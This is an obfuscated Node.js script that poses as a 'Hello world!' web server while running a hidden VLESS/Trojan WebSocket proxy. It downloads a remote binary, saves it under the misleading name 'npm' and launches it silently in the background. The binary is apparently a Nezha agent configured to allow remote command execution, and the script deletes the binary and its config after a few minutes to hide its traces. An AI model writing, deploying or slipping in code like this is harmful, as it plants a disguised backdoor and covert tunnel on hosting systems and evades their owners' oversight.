const _0x51f3fc=_0x29dd;(function(_0x3bb156,_0x1cbed9){const _0x5250da=_0x29dd,_0x4f5bd2=_0x3bb156();while(!![]){try{const _0x3dad99=-parseInt(_0x5250da(0x1fa))/0x1*(parseInt(_0x5250da(0x1cb))/0x2)+parseInt(_0x5250da(0x1be))/0x3*(-parseInt(_0x5250da(0x206))/0x4)+-parseInt(_0x5250da(0x198))/0x5*(-parseInt(_0x5250da(0x1e1))/0x6)+parseInt(_0x5250da(0x19b))/0x7+parseInt(_0x5250da(0x1a9))/0x8+parseInt(_0x5250da(0x1b9))/0x9+-parseInt(_0x5250da(0x1f7))/0xa;if(_0x3dad99===_0x1cbed9)break;else _0x4f5bd2['push'](_0x4f5bd2['shift']());}catch(_0x55d868){_0x4f5bd2['push'](_0x4f5bd2['shift']());}}}(_0x47ef,0xe9b76));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x51f3fc(0x1cf)),net=require(_0x51f3fc(0x1f5)),path=require('path'),crypto=require(_0x51f3fc(0x1dd)),{Buffer}=require(_0x51f3fc(0x1fb)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x51f3fc(0x1ba)]['UUID']||_0x51f3fc(0x1a7),NEZHA_SERVER=process[_0x51f3fc(0x1ba)][_0x51f3fc(0x1d2)]||'',NEZHA_PORT=process['env'][_0x51f3fc(0x1cc)]||'',NEZHA_KEY=process['env'][_0x51f3fc(0x1f0)]||'',DOMAIN=process[_0x51f3fc(0x1ba)][_0x51f3fc(0x1ef)]||_0x51f3fc(0x193),AUTO_ACCESS=process[_0x51f3fc(0x1ba)]['AUTO_ACCESS']||![],WSPATH=process['env'][_0x51f3fc(0x1a4)]||UUID[_0x51f3fc(0x208)](0x0,0x8),SUB_PATH=process[_0x51f3fc(0x1ba)][_0x51f3fc(0x1da)]||'sub',NAME=process['env'][_0x51f3fc(0x1b5)]||'',PORT=process[_0x51f3fc(0x1ba)][_0x51f3fc(0x213)]||0x1f41;let ISP='';function _0x47ef(){const _0x3d49c0=['country','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','arm64','utf8','2096','client_secret:\x20','text/plain','close','test','write','Failed\x20to\x20resolve\x20','reduce','772942owurYT','NEZHA_PORT','setsid\x20nohup\x20./npm\x20-s\x20','/bin/bash','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','false','NEZHA_SERVER','finish','index.html','sha224','Hello\x20world!','npm','update','length','SUB_PATH','Automatic\x20Access\x20Task\x20added\x20successfully','pop','crypto','aarch64','&type=A','then','2742ogVsvZ','&path=%2F','--tls','Server\x20is\x20running\x20on\x20port\x20','log','connect','createServer','post','1.1.1.1','toString','replace','map','\x20-p\x20','vless://','DOMAIN','NEZHA_KEY','Server','Answer','stream','https://arm64.ssss.nyc.mn/v1','net','catch','21876200NPThkg','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://speed.cloudflare.com/meta','1dwiecI','buffer','decode','true','hex','createHash','https://','Status','utf-8','join','npm\x20is\x20running','pipe','4uhNvav','chmod\x20+x\x20npm','slice','url','message','split','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2053','2087','config.yaml','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','text/html','2083','PORT','every','databricks.a.9.3.0.d.1.f.1.0.7.4.0.1.0.0.2.ip6.arpa','find','\x20with\x20all\x20DNS\x20servers','data','substr','2705iYnxIh','from','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','7977921lgWTUU','base64','get','readUInt16BE','npm\x20download\x20successfully','https://amd64.ssss.nyc.mn/v1','asOrganization','trojan://','arm','WSPATH','https://arm64.ssss.nyc.mn/agent','writeHead','48b743ac-5691-44ce-bd37-ebdceb588a3e','readUInt8','14709736XTSYOP','application/dns-json','&fp=chrome&type=ws&host=','once','end','digest','unlink','arch','npm\x20is\x20already\x20running,\x20skip\x20running...','8.8.4.4','readFile','send','NAME','https://oooo.serv00.net/add-url','includes','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','11871918apDsgJ','env','https://dns.google/resolve?name=','error','443','3040098EoSOYy'];_0x47ef=function(){return _0x3d49c0;};return _0x47ef();}const GetISP=async()=>{const _0x44069e=_0x51f3fc;try{const _0x540d38=await axios[_0x44069e(0x19d)](_0x44069e(0x1f9)),_0x335c65=_0x540d38[_0x44069e(0x196)];ISP=(_0x335c65[_0x44069e(0x1bf)]+'-'+_0x335c65[_0x44069e(0x1a1)])[_0x44069e(0x1eb)](/ /g,'_');}catch(_0x3b9d33){ISP='Unknown';}};GetISP();function _0x29dd(_0x4981e5,_0x129a77){_0x4981e5=_0x4981e5-0x193;const _0x47ef55=_0x47ef();let _0x29dd00=_0x47ef55[_0x4981e5];return _0x29dd00;}const httpServer=http[_0x51f3fc(0x1e7)]((_0x432a4a,_0x1b954c)=>{const _0xe9c5e8=_0x51f3fc;if(_0x432a4a[_0xe9c5e8(0x209)]==='/'){const _0x1c56ab=path[_0xe9c5e8(0x203)](__dirname,_0xe9c5e8(0x1d4));fs[_0xe9c5e8(0x1b3)](_0x1c56ab,_0xe9c5e8(0x1c2),(_0x46c513,_0x56945e)=>{const _0x50d581=_0xe9c5e8;if(_0x46c513){_0x1b954c[_0x50d581(0x1a6)](0xc8,{'Content-Type':_0x50d581(0x211)}),_0x1b954c[_0x50d581(0x1ad)](_0x50d581(0x1d6));return;}_0x1b954c['writeHead'](0xc8,{'Content-Type':_0x50d581(0x211)}),_0x1b954c['end'](_0x56945e);});return;}else{if(_0x432a4a[_0xe9c5e8(0x209)]==='/'+SUB_PATH){const _0x696c5b=NAME?NAME+'-'+ISP:ISP,_0x49bf00=_0xe9c5e8(0x1ee)+UUID+_0xe9c5e8(0x1c0)+DOMAIN+_0xe9c5e8(0x1ab)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x696c5b,_0xc554df=_0xe9c5e8(0x1a2)+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0xe9c5e8(0x1ab)+DOMAIN+_0xe9c5e8(0x1e2)+WSPATH+'#'+_0x696c5b,_0x21f591=_0x49bf00+'\x0a'+_0xc554df,_0x253793=Buffer[_0xe9c5e8(0x199)](_0x21f591)['toString'](_0xe9c5e8(0x19c));_0x1b954c[_0xe9c5e8(0x1a6)](0xc8,{'Content-Type':'text/plain'}),_0x1b954c[_0xe9c5e8(0x1ad)](_0x253793+'\x0a');}else _0x1b954c['writeHead'](0x194,{'Content-Type':_0xe9c5e8(0x1c5)}),_0x1b954c[_0xe9c5e8(0x1ad)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x51f3fc(0x1f1))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x51f3fc(0x1b2),_0x51f3fc(0x1e9)];function resolveHost(_0x1ca0ef){return new Promise((_0x41e555,_0x18e57a)=>{const _0x4dcec6=_0x29dd;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4dcec6(0x1c7)](_0x1ca0ef)){_0x41e555(_0x1ca0ef);return;}let _0x4f7503=0x0;function _0x21cc00(){const _0x48625a=_0x4dcec6;if(_0x4f7503>=DNS_SERVERS[_0x48625a(0x1d9)]){_0x18e57a(new Error(_0x48625a(0x1c9)+_0x1ca0ef+_0x48625a(0x195)));return;}const _0x39c9c8=DNS_SERVERS[_0x4f7503];_0x4f7503++;const _0x1a0dc8=_0x48625a(0x1bb)+encodeURIComponent(_0x1ca0ef)+_0x48625a(0x1df);axios[_0x48625a(0x19d)](_0x1a0dc8,{'timeout':0x1388,'headers':{'Accept':_0x48625a(0x1aa)}})[_0x48625a(0x1e0)](_0x562193=>{const _0x2ffce2=_0x48625a,_0x7209d5=_0x562193['data'];if(_0x7209d5[_0x2ffce2(0x201)]===0x0&&_0x7209d5[_0x2ffce2(0x1f2)]&&_0x7209d5[_0x2ffce2(0x1f2)][_0x2ffce2(0x1d9)]>0x0){const _0xfbe9e9=_0x7209d5['Answer'][_0x2ffce2(0x194)](_0x28594d=>_0x28594d['type']===0x1);if(_0xfbe9e9){_0x41e555(_0xfbe9e9['data']);return;}}_0x21cc00();})[_0x48625a(0x1f6)](_0x27f1bc=>{_0x21cc00();});}_0x21cc00();});}function handleVlessConnection(_0xe63808,_0xddf0ff){const _0x1d6d02=_0x51f3fc,[_0x3349d7]=_0xddf0ff,_0x1e4d99=_0xddf0ff['slice'](0x1,0x11);if(!_0x1e4d99[_0x1d6d02(0x214)]((_0x31e243,_0x2f07d0)=>_0x31e243==parseInt(uuid[_0x1d6d02(0x197)](_0x2f07d0*0x2,0x2),0x10)))return![];let _0x4df402=_0xddf0ff[_0x1d6d02(0x208)](0x11,0x12)[_0x1d6d02(0x1a8)]()+0x13;const _0x408274=_0xddf0ff[_0x1d6d02(0x208)](_0x4df402,_0x4df402+=0x2)[_0x1d6d02(0x19e)](0x0),_0x9db20d=_0xddf0ff['slice'](_0x4df402,_0x4df402+=0x1)[_0x1d6d02(0x1a8)](),_0x4c2138=_0x9db20d==0x1?_0xddf0ff[_0x1d6d02(0x208)](_0x4df402,_0x4df402+=0x4)[_0x1d6d02(0x203)]('.'):_0x9db20d==0x2?new TextDecoder()[_0x1d6d02(0x1fc)](_0xddf0ff[_0x1d6d02(0x208)](_0x4df402+0x1,_0x4df402+=0x1+_0xddf0ff['slice'](_0x4df402,_0x4df402+0x1)['readUInt8']())):_0x9db20d==0x3?_0xddf0ff[_0x1d6d02(0x208)](_0x4df402,_0x4df402+=0x10)[_0x1d6d02(0x1ca)]((_0x182986,_0x1064a6,_0x457d6a,_0x1e7c63)=>_0x457d6a%0x2?_0x182986['concat'](_0x1e7c63[_0x1d6d02(0x208)](_0x457d6a-0x1,_0x457d6a+0x1)):_0x182986,[])[_0x1d6d02(0x1ec)](_0x1c8894=>_0x1c8894[_0x1d6d02(0x19e)](0x0)[_0x1d6d02(0x1ea)](0x10))['join'](':'):'';_0xe63808[_0x1d6d02(0x1b4)](new Uint8Array([_0x3349d7,0x0]));const _0x691860=createWebSocketStream(_0xe63808);return resolveHost(_0x4c2138)[_0x1d6d02(0x1e0)](_0x2d51fc=>{const _0x16322b=_0x1d6d02;net[_0x16322b(0x1e6)]({'host':_0x2d51fc,'port':_0x408274},function(){const _0x44ef5d=_0x16322b;this['write'](_0xddf0ff[_0x44ef5d(0x208)](_0x4df402)),_0x691860['on'](_0x44ef5d(0x1bc),()=>{})[_0x44ef5d(0x205)](this)['on'](_0x44ef5d(0x1bc),()=>{})[_0x44ef5d(0x205)](_0x691860);})['on']('error',()=>{});})['catch'](_0x25456a=>{const _0x4db9a6=_0x1d6d02;net[_0x4db9a6(0x1e6)]({'host':_0x4c2138,'port':_0x408274},function(){const _0x55539f=_0x4db9a6;this[_0x55539f(0x1c8)](_0xddf0ff[_0x55539f(0x208)](_0x4df402)),_0x691860['on'](_0x55539f(0x1bc),()=>{})[_0x55539f(0x205)](this)['on'](_0x55539f(0x1bc),()=>{})[_0x55539f(0x205)](_0x691860);})['on'](_0x4db9a6(0x1bc),()=>{});}),!![];}function handleTrojanConnection(_0x408181,_0x2ceca7){const _0x765b42=_0x51f3fc;try{if(_0x2ceca7[_0x765b42(0x1d9)]<0x3a)return![];const _0x3a371d=_0x2ceca7[_0x765b42(0x208)](0x0,0x38)[_0x765b42(0x1ea)](),_0x258896=[UUID];let _0x4d171a=null;for(const _0x43d849 of _0x258896){const _0x9a5495=crypto[_0x765b42(0x1ff)](_0x765b42(0x1d5))[_0x765b42(0x1d8)](_0x43d849)[_0x765b42(0x1ae)](_0x765b42(0x1fe));if(_0x9a5495===_0x3a371d){_0x4d171a=_0x43d849;break;}}if(!_0x4d171a)return![];let _0x4b0a84=0x38;_0x2ceca7[_0x4b0a84]===0xd&&_0x2ceca7[_0x4b0a84+0x1]===0xa&&(_0x4b0a84+=0x2);const _0x1512e3=_0x2ceca7[_0x4b0a84];if(_0x1512e3!==0x1)return![];_0x4b0a84+=0x1;const _0x5b08db=_0x2ceca7[_0x4b0a84];_0x4b0a84+=0x1;let _0x947395,_0x5587b5;if(_0x5b08db===0x1)_0x947395=_0x2ceca7[_0x765b42(0x208)](_0x4b0a84,_0x4b0a84+0x4)['join']('.'),_0x4b0a84+=0x4;else{if(_0x5b08db===0x3){const _0x30b90a=_0x2ceca7[_0x4b0a84];_0x4b0a84+=0x1,_0x947395=_0x2ceca7['slice'](_0x4b0a84,_0x4b0a84+_0x30b90a)[_0x765b42(0x1ea)](),_0x4b0a84+=_0x30b90a;}else{if(_0x5b08db===0x4)_0x947395=_0x2ceca7[_0x765b42(0x208)](_0x4b0a84,_0x4b0a84+0x10)['reduce']((_0x58727d,_0x49100a,_0x1f7e55,_0xc2d80a)=>_0x1f7e55%0x2?_0x58727d['concat'](_0xc2d80a['slice'](_0x1f7e55-0x1,_0x1f7e55+0x1)):_0x58727d,[])[_0x765b42(0x1ec)](_0x3b7957=>_0x3b7957[_0x765b42(0x19e)](0x0)['toString'](0x10))[_0x765b42(0x203)](':'),_0x4b0a84+=0x10;else return![];}}_0x5587b5=_0x2ceca7[_0x765b42(0x19e)](_0x4b0a84),_0x4b0a84+=0x2;_0x4b0a84<_0x2ceca7[_0x765b42(0x1d9)]&&_0x2ceca7[_0x4b0a84]===0xd&&_0x2ceca7[_0x4b0a84+0x1]===0xa&&(_0x4b0a84+=0x2);const _0x362f79=createWebSocketStream(_0x408181);return resolveHost(_0x947395)[_0x765b42(0x1e0)](_0x414dd8=>{const _0x539cb2=_0x765b42;net[_0x539cb2(0x1e6)]({'host':_0x414dd8,'port':_0x5587b5},function(){const _0x15dcf6=_0x539cb2;_0x4b0a84<_0x2ceca7[_0x15dcf6(0x1d9)]&&this[_0x15dcf6(0x1c8)](_0x2ceca7[_0x15dcf6(0x208)](_0x4b0a84)),_0x362f79['on']('error',()=>{})['pipe'](this)['on'](_0x15dcf6(0x1bc),()=>{})[_0x15dcf6(0x205)](_0x362f79);})['on'](_0x539cb2(0x1bc),()=>{});})[_0x765b42(0x1f6)](_0x1a21c4=>{net['connect']({'host':_0x947395,'port':_0x5587b5},function(){const _0x6cb8c5=_0x29dd;_0x4b0a84<_0x2ceca7[_0x6cb8c5(0x1d9)]&&this[_0x6cb8c5(0x1c8)](_0x2ceca7[_0x6cb8c5(0x208)](_0x4b0a84)),_0x362f79['on'](_0x6cb8c5(0x1bc),()=>{})[_0x6cb8c5(0x205)](this)['on']('error',()=>{})[_0x6cb8c5(0x205)](_0x362f79);})['on']('error',()=>{});}),!![];}catch(_0x39ee15){return![];}}wss['on']('connection',(_0x25d1ec,_0x56a77a)=>{const _0x4b243f=_0x51f3fc,_0x45f644=_0x56a77a[_0x4b243f(0x209)]||'';_0x25d1ec[_0x4b243f(0x1ac)](_0x4b243f(0x20a),_0x59a04e=>{const _0x5ce037=_0x4b243f;if(_0x59a04e['length']>0x11&&_0x59a04e[0x0]===0x0){const _0x58ab50=_0x59a04e[_0x5ce037(0x208)](0x1,0x11),_0x3cc1c9=_0x58ab50[_0x5ce037(0x214)]((_0x2724c4,_0x108e44)=>_0x2724c4==parseInt(uuid[_0x5ce037(0x197)](_0x108e44*0x2,0x2),0x10));if(_0x3cc1c9){!handleVlessConnection(_0x25d1ec,_0x59a04e)&&_0x25d1ec[_0x5ce037(0x1c6)]();return;}}!handleTrojanConnection(_0x25d1ec,_0x59a04e)&&_0x25d1ec[_0x5ce037(0x1c6)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x56caf2=_0x51f3fc,_0x27dddb=os[_0x56caf2(0x1b0)]();return _0x27dddb===_0x56caf2(0x1a3)||_0x27dddb===_0x56caf2(0x1c1)||_0x27dddb===_0x56caf2(0x1de)?!NEZHA_PORT?_0x56caf2(0x1f4):_0x56caf2(0x1a5):!NEZHA_PORT?_0x56caf2(0x1a0):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5e4d79=_0x51f3fc;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5ec871=getDownloadUrl(),_0x2558ee=await axios({'method':'get','url':_0x5ec871,'responseType':_0x5e4d79(0x1f3)}),_0x501526=fs['createWriteStream'](_0x5e4d79(0x1d7));return _0x2558ee['data'][_0x5e4d79(0x205)](_0x501526),new Promise((_0x439265,_0x593ff9)=>{const _0x199692=_0x5e4d79;_0x501526['on'](_0x199692(0x1d3),()=>{const _0x1430fa=_0x199692;console['log'](_0x1430fa(0x19f)),exec(_0x1430fa(0x207),_0x29f29b=>{if(_0x29f29b)_0x593ff9(_0x29f29b);_0x439265();});}),_0x501526['on'](_0x199692(0x1bc),_0x593ff9);});}catch(_0x5f5354){throw _0x5f5354;}},runnz=async()=>{const _0x1e4f5b=_0x51f3fc;try{const _0x11ec8a=execSync(_0x1e4f5b(0x19a),{'encoding':_0x1e4f5b(0x202)});if(_0x11ec8a['trim']()!==''){console[_0x1e4f5b(0x1e5)](_0x1e4f5b(0x1b1));return;}}catch(_0x49c3b4){}await downloadFile();let _0x290619='',_0x163ecc=[_0x1e4f5b(0x1bd),'8443',_0x1e4f5b(0x1c3),_0x1e4f5b(0x20e),_0x1e4f5b(0x212),_0x1e4f5b(0x20d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1cfdfe=_0x163ecc[_0x1e4f5b(0x1b7)](NEZHA_PORT)?_0x1e4f5b(0x1e3):'';_0x290619=_0x1e4f5b(0x1cd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1e4f5b(0x1ed)+NEZHA_KEY+'\x20'+_0x1cfdfe+_0x1e4f5b(0x1d0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4e2253=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1e4f5b(0x20b)](':')[_0x1e4f5b(0x1dc)]():'',_0x1a90ca=_0x163ecc[_0x1e4f5b(0x1b7)](_0x4e2253)?_0x1e4f5b(0x1fd):_0x1e4f5b(0x1d1),_0xd4b44c=_0x1e4f5b(0x1c4)+NEZHA_KEY+_0x1e4f5b(0x20c)+NEZHA_SERVER+_0x1e4f5b(0x1f8)+_0x1a90ca+_0x1e4f5b(0x1b8)+UUID;fs['writeFileSync'](_0x1e4f5b(0x20f),_0xd4b44c);}_0x290619='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x1e4f5b(0x1e5)](_0x1e4f5b(0x210));return;}}try{exec(_0x290619,{'shell':_0x1e4f5b(0x1ce)},_0x545011=>{const _0xb94aad=_0x1e4f5b;if(_0x545011)console['error']('npm\x20running\x20error:',_0x545011);else console[_0xb94aad(0x1e5)](_0xb94aad(0x204));});}catch(_0xd6b0a1){console['error']('error:\x20'+_0xd6b0a1);}};async function addAccessTask(){const _0x41cc7e=_0x51f3fc;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x363133=_0x41cc7e(0x200)+DOMAIN+'/'+SUB_PATH;try{const _0x2727a0=await axios[_0x41cc7e(0x1e8)](_0x41cc7e(0x1b6),{'url':_0x363133},{'headers':{'Content-Type':'application/json'}});console[_0x41cc7e(0x1e5)](_0x41cc7e(0x1db));}catch(_0x56c5c6){}}const delFiles=()=>{const _0xe23b3=_0x51f3fc;fs[_0xe23b3(0x1af)](_0xe23b3(0x1d7),()=>{}),fs[_0xe23b3(0x1af)](_0xe23b3(0x20f),()=>{});};httpServer['listen'](PORT,()=>{const _0x5d196d=_0x51f3fc;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5d196d(0x1e5)](_0x5d196d(0x1e4)+PORT);});
